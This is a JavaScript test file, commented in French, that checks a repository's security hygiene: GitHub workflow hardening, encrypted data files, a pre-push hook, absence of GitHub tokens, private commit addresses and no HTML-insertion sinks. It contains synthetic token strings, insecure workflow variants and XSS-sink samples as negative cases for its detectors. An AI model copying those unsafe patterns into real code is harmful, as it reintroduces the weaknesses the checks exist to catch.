    "conteneur": vrai.replace("    runs-on: ubuntu-latest", "    runs-on: ubuntu-latest\n    container: node:24"),
    "machine de l'auteur": vrai.replace("runs-on: ubuntu-latest", "runs-on: self-hosted"),
    "autre dossier": vrai.replace("        run: node outils", "        working-directory: autre\n        run: node outils"),
    "autre branche": vrai.replace("          persist-credentials: false", "          persist-credentials: false\n          ref: autre"),
    "second checkout": vrai.replace("      - name: Installer Node 24", `      - uses: ${actionsDe(controles)[0]} # v7.0.1\n      - name: Installer Node 24`),
    "interpréteur par défaut": vrai.replace("jobs:\n", "defaults:\n  run:\n    shell: bash\njobs:\n"),
    "condition": vrai.replace("        run: node outils", "        if: false\n        run: node outils"),
    "échec caché": vrai.replace("        run: node outils", "        continue-on-error: true\n        run: node outils"),
    "délai long": vrai.replace("timeout-minutes: 5", "timeout-minutes: 360"),
  };
  for (const [cas, variante] of Object.entries(variantes)) assert.notEqual(variante, vrai, `${cas} : la variante n'a rien changé`);
  const admises = Object.entries(variantes).filter(([, variante]) => defautsDeLAutomate(variante, controles).length === 0).map(([cas]) => cas);
  assert.deepEqual(admises, [], "variantes fautives admises");
});

test("workflow — repère un workflow inconnu", () => {
  const chemins = [WORKFLOWS.controles, WORKFLOWS.personnages, ".github/workflows/autre.yml", ".github/workflows/Controles.yml", ".GitHub/Workflows/x.yaml", ".github/dependabot.yml"];
  assert.deepEqual(workflowsInconnus(chemins), chemins.slice(2, 5));
});

test("workflow — les workflows du dépôt sont sûrs, et ce sont les seuls (§ 10.2)", () => {
  const workflows = cheminsDuDepot().filter((chemin) => chemin.toLowerCase().startsWith(".github/workflows/"));
  assert.deepEqual(workflowsInconnus(workflows), []);
  assert.deepEqual([...workflows].sort(), Object.values(WORKFLOWS).sort());
  const controles = lire(WORKFLOWS.controles, "utf8");
  assert.deepEqual(defautsDuWorkflow(controles), [], WORKFLOWS.controles);
  assert.deepEqual(defautsDeLAutomate(lire(WORKFLOWS.personnages, "utf8"), controles), [], WORKFLOWS.personnages);
});

// Un fichier rangé d'essai : des octets qui ne se lisent pas comme du texte,
// comme un vrai chiffré (§ 15.8).
function fichierDEssai(identifiant, octetIv = 9) {
  return {
    format: 1, identifiant, depose_le: "2026-09-30T10:21:36.536Z", range_le: "2026-09-30T10:22:05Z", ticket: 12,
    sel: Buffer.alloc(16, 7).toString("base64"), iv: Buffer.alloc(12, octetIv).toString("base64"), contenu: Buffer.alloc(48, 0x9c).toString("base64"),
  };
}

test("personnages — repère un chemin hors forme, un fichier illisible ou en clair, un index qui ne dit pas les fichiers", () => {
  const [A, B, C] = ["Qx7-aZ_09bcdEFGHijklmn", "AAAAAAAAAAAAAAAAAAAAAA", "BBBBBBBBBBBBBBBBBBBBBB"];
  const [fa, fb] = [fichierDEssai(A), fichierDEssai(B, 5)];
  const chemin = (id) => `personnages/${id}.chiffre.json`;
  const bon = { [chemin(A)]: ecrireFichier(fa), [chemin(B)]: ecrireFichier(fb), [CHEMIN_INDEX]: ecrireIndex([fa, fb]) };
  const defauts = (arbre) => defautsDesPersonnages(Object.keys(arbre), (c) => arbre[c]);
  assert.deepEqual(defauts(bon), []);
  assert.deepEqual(defauts({}), []);
  assert.deepEqual(defauts({ [CHEMIN_INDEX]: ecrireIndex([]) }), []);
  // Un contenu en clair, seulement encodé : le vérificateur de la page l'admet, pas ce contrôle.
  const clair = { ...fa, contenu: Buffer.from(JSON.stringify({ nom: "Aubépine Crèmebrûlée" })).toString("base64") };
  const { [CHEMIN_INDEX]: _index, ...sansIndex } = bon;
  const cas = {
    "chemin hors forme": { ...bon, "personnages/notes.txt": "x" },
    "sous-dossier": { ...bon, [`personnages/sous/${A}.chiffre.json`]: bon[chemin(A)] },
    "nom dans le chemin": { ...bon, "personnages/Aubépine.chiffre.json": bon[chemin(A)] },
    "casse du dossier": { ...bon, [`Personnages/${C}.chiffre.json`]: ecrireFichier(fichierDEssai(C)) },
    "champ en plus": { ...bon, [chemin(A)]: JSON.stringify({ ...fa, nom: "Aubépine" }, null, 2) },
    "identifiant d'un autre chemin": { ...bon, [chemin(A)]: bon[chemin(B)] },
    "contenu en clair": { ...bon, [chemin(A)]: ecrireFichier(clair) },
    "index absent": sansIndex,
    "index en retard": { ...bon, [CHEMIN_INDEX]: ecrireIndex([fa]) },
    "index en trop": { ...bon, [CHEMIN_INDEX]: ecrireIndex([fa, fb, fichierDEssai(C)]) },
    "version fausse": { ...bon, [CHEMIN_INDEX]: ecrireIndex([fa, fichierDEssai(B, 6)]) },
    "date fausse": { ...bon, [CHEMIN_INDEX]: ecrireIndex([fa, { ...fb, range_le: "2026-09-30T11:00:00Z" }]) },
    "index avec un nom": { ...bon, [CHEMIN_INDEX]: bon[CHEMIN_INDEX].replace('"version"', '"nom": "Aubépine",\n      "version"') },
    "index illisible": { ...bon, [CHEMIN_INDEX]: "{" },
  };
  for (const [nom, arbre] of Object.entries(cas)) assert.notDeepEqual(defauts(arbre), [], nom);
  // Les mêmes formes, dans l'arbre comme dans l'historique.
  const chemins = [chemin(A), CHEMIN_INDEX, "personnages/clair.json", "personnages/notes.txt", `personnages/sous/${A}.chiffre.json`, "personnages/court.chiffre.json"];
  assert.deepEqual(fichiersHorsListe(chemins), ["personnages/clair.json", `personnages/sous/${A}.chiffre.json`, "personnages/court.chiffre.json"]);
  assert.deepEqual(personnagesHorsForme(chemins), chemins.slice(2));
  assert.deepEqual([...new Set(cheminsInterdits(chemins))].sort(), chemins.slice(2).sort());
});

test("personnages — les fichiers de personnages/ sont rangés, chiffrés, et l'index les dit tous", () => {
  assert.deepEqual(defautsDesPersonnages(cheminsDuDepot(), (chemin) => lire(chemin, "utf8")), []);
});

// Le crochet pre-push (§ 10.3) : les contrôles passent avant chaque envoi.
const CROCHET = ".githooks/pre-push";

test("crochet — le crochet pre-push existe, en sh, exécutable, et lance node --test", () => {
  const texte = lire(CROCHET, "utf8");
  assert.match(texte.split("\n")[0], /^#!\/bin\/sh\s*$/);
  assert.doesNotMatch(texte, /\r/, "des fins de ligne Windows casseraient sh");
  assert.match(texte, /^if node --test /m);
  assert.match(texte, /Envoi refusé/);
  assert.match(texte, /^exit 1\s*$/m);
  assert.match(git("ls-files", "-s", CROCHET), /^100755 /, "mode 100755 dans l'index : chmod +x pour Git");
  assert.match(git("check-attr", "eol", "--", CROCHET), /: eol: lf$/m, "extrait toujours en LF, même avec core.autocrlf");
});

test("crochet — core.hooksPath désigne .githooks sur ce poste", { skip: process.env.GITHUB_ACTIONS ? "GitHub Actions n'envoie rien : le crochet protège les envois du poste" : false }, () => {
  assert.equal(git("config", "--local", "--get", "core.hooksPath").trim(), ".githooks");
});

test("crochet — un envoi est refusé quand un contrôle échoue, quand tout n'est pas commité, ou sans node ; accepté sinon", (t) => {
  const essai = mkdtempSync(join(tmpdir(), "atelier-crochet-"));
  try {
    const travail = join(essai, "travail");
    const distant = join(essai, "distant.git");
    gitDans(essai, "init", "-q", "--bare", distant);
    gitDans(essai, "init", "-q", travail);
    const options = ["-c", "user.name=Essai", "-c", "user.email=essai@users.noreply.github.com", "-c", "commit.gpgsign=false"];
    const crochets = ["-c", `core.hooksPath=${join(RACINE, ".githooks").replaceAll("\\", "/")}`];
    const g = (...parametres) => gitDans(travail, ...options, ...crochets, ...parametres);
    // Un envoi : null s'il passe, sinon ce qu'a dit le crochet.
    const envoyer = (environnement = ENVIRONNEMENT) => {
      try {
        execFileSync("git", [...crochets, "push", "-q", distant, "HEAD:main"], { cwd: travail, encoding: "utf8", env: environnement, stdio: "pipe" });
        return null;
      } catch (erreur) {
        return `${erreur.stdout}${erreur.stderr}`;
      }
    };
    const rienNestParti = () => assert.equal(gitDans(distant, "branch", "--list").trim(), "", "rien n'est parti");
    const controle = (reussit) => `import { test } from "node:test";\nimport assert from "node:assert/strict";\ntest("essai", () => assert.equal(${reussit}, true));\n`;
    mkdirSync(join(travail, "tests"));
    writeFileSync(join(travail, "tests/essai.test.mjs"), controle(false));
    g("add", "-A");
    g("commit", "-q", "-m", "un contrôle cassé");

    // Un contrôle échoue : refusé, même si NODE_TEST_CONTEXT est hérité.
    assert.match(envoyer() ?? "", /Envoi refusé : des contrôles échouent/);
    assert.match(envoyer({ ...ENVIRONNEMENT, NODE_TEST_CONTEXT: "child-v8" }) ?? "", /Envoi refusé : des contrôles échouent/);
    rienNestParti();

    // Réparé sur le disque, mais pas commité : ce qui partirait est cassé.
    writeFileSync(join(travail, "tests/essai.test.mjs"), controle(true));
    assert.match(envoyer() ?? "", /Envoi refusé : des modifications ne sont pas commitées/);
    g("commit", "-q", "-am", "le contrôle réparé");
    // Un fichier nouveau, non suivi : refusé aussi.
    writeFileSync(join(travail, "oublie.txt"), "un fichier oublié au commit");
    assert.match(envoyer() ?? "", /Envoi refusé : des modifications ne sont pas commitées/);
    rmSync(join(travail, "oublie.txt"));
    rienNestParti();

    // Sans node : refusé, et le message le dit.
    const cle = Object.keys(ENVIRONNEMENT).find((nom) => nom.toUpperCase() === "PATH");
    const executable = process.platform === "win32" ? ".exe" : "";
    const dossiers = ENVIRONNEMENT[cle].split(delimiter);
    const avecNode = dossiers.filter((dossier) => existsSync(join(dossier, `node${executable}`)));
    if (avecNode.some((dossier) => existsSync(join(dossier, `git${executable}`)) || existsSync(join(dossier, "sh")))) {
      t.diagnostic("node partage son dossier avec git ou sh : le cas « sans node » n'est pas essayé ici");
    } else {
      const sansNode = { ...ENVIRONNEMENT, [cle]: dossiers.filter((dossier) => !avecNode.includes(dossier)).join(delimiter) };
      assert.match(envoyer(sansNode) ?? "", /Envoi refusé : node introuvable/);
      rienNestParti();
    }

    // Tout est commité et les contrôles passent : l'envoi part.
    assert.equal(envoyer(), null);
    assert.equal(gitDans(distant, "rev-parse", "main").trim(), g("rev-parse", "HEAD").trim(), "l'envoi est passé");
  } finally {
    rmSync(essai, { recursive: true, force: true });
  }
});

test("interdit 2 — repère des données en clair dans donnees/", () => {
  const kdf = { nom: "PBKDF2-SHA256", iterations: 600000, sel: Buffer.alloc(16, 7).toString("base64") };
  // Des octets qui ne se lisent pas comme du texte, comme un vrai chiffré.
  const octets = Buffer.alloc(32, 0x9c);
  const chiffre = { nom: "AES-GCM", iv: Buffer.alloc(12, 9).toString("base64"), donnees: octets.toString("base64") };
  const enTete = { format: 2, publiee_le: "2026-09-28T14:32:00+02:00", empreinte: `sha256:${createHash("sha256").update(octets).digest("hex")}` };
  const clair = Buffer.from(JSON.stringify({ format: 1, blocs: [{ nom: "Secret du MJ" }] })).toString("base64");
  const essais = [
    [{ ...enTete, kdf, chiffre }, 0],
    [{ ...enTete, kdf, chiffre, blocs: [] }, 1],
    [{ ...enTete, kdf: { ...kdf, capacites: [] }, chiffre }, 1],
    [{ ...enTete, kdf, chiffre: { ...chiffre, donnees: '{"blocs":[]}' } }, 1],
    [{ ...enTete, kdf }, 1],
    [{ ...enTete, kdf, chiffre: { ...chiffre, donnees: clair } }, 1],
    [{ ...enTete, kdf: { ...kdf, iterations: 1000 }, chiffre }, 1],
    [{ ...enTete, kdf: { ...kdf, sel: "c2Vs" }, chiffre }, 1],
    [{ ...enTete, kdf, chiffre: { ...chiffre, iv: "aXY=" } }, 1],
    // Le format 1 ne se lit plus (lot 2 bis) : aucun fichier de donnees/ ne
    // l'a, pas même celui du 29/09/2026.
    [{ ...enTete, format: 1, empreinte: `sha256:${"1".repeat(64)}`, kdf, chiffre }, 1],
    [{ ...enTete, format: 1, empreinte: "sha256:de78dcbfbcf5f39a1187b6821359aef6fcda740faa8c1f4c79094479428ad854", kdf, chiffre }, 1],
  ];
  for (const [banque, nombre] of essais) {
    const fautes = donneesEnClair([BANQUE], () => JSON.stringify(banque));
    assert.equal(fautes.length, nombre, JSON.stringify(banque));
  }
  assert.equal(donneesEnClair([BANQUE], () => "{ pas du JSON").length, 1);
  assert.equal(donneesEnClair(["donnees/banque.json", "donnees/copie.csv", "Donnees/clair.json"], () => "{}").length, 3);
});

test("interdit 2 — repère un format inconnu, ou une empreinte de format 2 qui n'est pas celle des octets chiffrés", () => {
  const vraie = JSON.parse(lire("essais/banque_demo.chiffree.json", "utf8"));
  assert.equal(defautDeFormeChiffree(JSON.stringify({ ...vraie, format: 3 })), "format 3 inconnu");
  assert.match(defautDeFormeChiffree(JSON.stringify({ ...vraie, empreinte: `sha256:${"0".repeat(64)}` })), /format 2/);
});

test("interdit 2 — la banque d'essais/ a la forme chiffrée du § 7.1, au format 2 ; le fichier du format 1 est retiré", () => {
  const banques = cheminsDuDepot().filter((chemin) => /^essais\/.+\.chiffree\.json$/.test(chemin));
  assert.deepEqual(banques.sort(), ["essais/banque_demo.chiffree.json"]);
  for (const chemin of banques) assert.equal(defautDeFormeChiffree(lire(chemin, "utf8")), null, chemin);
  assert.equal(JSON.parse(lire("essais/banque_demo.chiffree.json", "utf8")).format, 2);
  // Retiré du dépôt, il reste permis dans l'historique, et là seulement.
  assert.deepEqual(fichiersHorsListe(JSON_DE_L_HISTORIQUE), JSON_DE_L_HISTORIQUE);
  assert.deepEqual(fichiersHorsListe(JSON_DE_L_HISTORIQUE, { historique: true }), []);
});

test("interdit 2 — donnees/ ne contient que la banque chiffrée", () => {
  assert.deepEqual(donneesEnClair(cheminsDuDepot(), (chemin) => lire(chemin, "utf8")), []);
});

test("interdit 3 — repère un jeton entier, pas un préfixe cité", () => {
  const classique = "ghp_" + "A1b2".repeat(9);
  const aPorteeFine = "github_pat_" + "x".repeat(82);
  const fichiers = [
    { chemin: "a.js", contenu: `const cle = "${classique}";` },
    { chemin: "b.md", contenu: "les préfixes `github_pat_` et `ghp_` sont interdits" },
    { chemin: "c.txt", contenu: `\n\n${aPorteeFine}` },
    { chemin: "d.txt", contenu: "ghp_" + "trop_court" },
    { chemin: "e.txt", contenu: Buffer.from(`\uFEFFnote\r\n${classique}\r\n`, "utf16le").toString("latin1") },
  ];
  assert.deepEqual(jetonsEntiers(fichiers), ["a.js, ligne 1", "c.txt, ligne 3", "e.txt, ligne 2"]);
});

test("interdit 3 — aucun jeton GitHub dans le dépôt", () => {
  const fichiers = cheminsDuDepot().map((chemin) => ({ chemin, contenu: lire(chemin) }));
  assert.deepEqual(jetonsEntiers(fichiers), []);
});

test("adresses — repère une adresse qui n'est pas privée", () => {
  const commits = [
    { sha: "1".repeat(40), auteur: "123+exemple@users.noreply.github.com", committer: "noreply@github.com" },
    { sha: "2".repeat(40), auteur: "quelquun@example.com", committer: "quelquun@example.com" },
    { sha: "3".repeat(40), auteur: "noreply@github.com", committer: "exemple@users.noreply.github.com" },
  ];
  assert.deepEqual(adressesPubliques(commits), [
    "2222222 : auteur <quelquun@example.com>",
    "2222222 : committer <quelquun@example.com>",
    "3333333 : auteur <noreply@github.com>",
  ]);
});

test("adresses — l'historique ne porte que des adresses privées GitHub", () => {
  const commits = commitsDuDepot();
  assert.ok(commits.length > 0, "historique vide : le contrôle ne prouverait rien");
  assert.deepEqual(adressesPubliques(commits), []);
});

test("HTML — repère une insertion de HTML", () => {
  const fichiers = [
    { chemin: "js/a.js", contenu: "fiche.textContent = nom;\nfiche.innerHTML = nom;" },
    { chemin: "js/b.js", contenu: "document . write(nom);" },
    { chemin: "js/c.js", contenu: "liste.insertAdjacentHTML('beforeend', nom);" },
    { chemin: "js/d.js", contenu: "const html = 'innerHTMLx';" },
  ];
  assert.deepEqual(insertionsHtml(fichiers), ["js/a.js, ligne 2", "js/b.js, ligne 1", "js/c.js, ligne 1"]);
  const chemins = ["index.html", "manifest.webmanifest", "css/ecran.css", "js/ecrans/liste.js", "outils/icones.js", "tests/depot.test.js", "SPECIFICATION.md"];
  assert.deepEqual(chemins.filter((chemin) => FICHIER_DU_SITE.test(chemin)), chemins.slice(0, 5));
});

test("HTML — aucune insertion de HTML dans les fichiers du site", () => {
  const fichiers = cheminsDuDepot()
    .filter((chemin) => FICHIER_DU_SITE.test(chemin))
    .map((chemin) => ({ chemin, contenu: lire(chemin, "utf8") }));
  assert.deepEqual(insertionsHtml(fichiers), []);
});
